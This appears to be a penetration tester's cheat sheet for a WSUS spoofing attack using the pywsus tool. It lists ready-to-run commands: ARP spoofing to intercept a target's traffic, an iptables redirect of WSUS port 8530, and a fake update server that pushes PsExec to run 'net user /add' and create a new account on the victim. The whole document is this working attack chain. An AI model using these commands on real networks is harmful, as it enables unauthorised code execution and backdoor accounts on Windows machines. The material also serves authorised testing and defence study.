### source
https://github.com/GoSecure/pywsus  

### get into mitm position
```
arpspoof -i <interface> -t <rhost> -r <gatewayIp>
```

### send traffic to localhost
```
iptables -t nat -I PREROUTING -i <interface> -p tcp --dport 8530 -j REDIRECT --to-port 8530
```

### start local wsus
```
python3 pywsus.py -H <lhost> -p 8530 -e <psexecExeFile> -c '/accepteula /s cmd.exe /c "net user /add <user> <password>"'
```

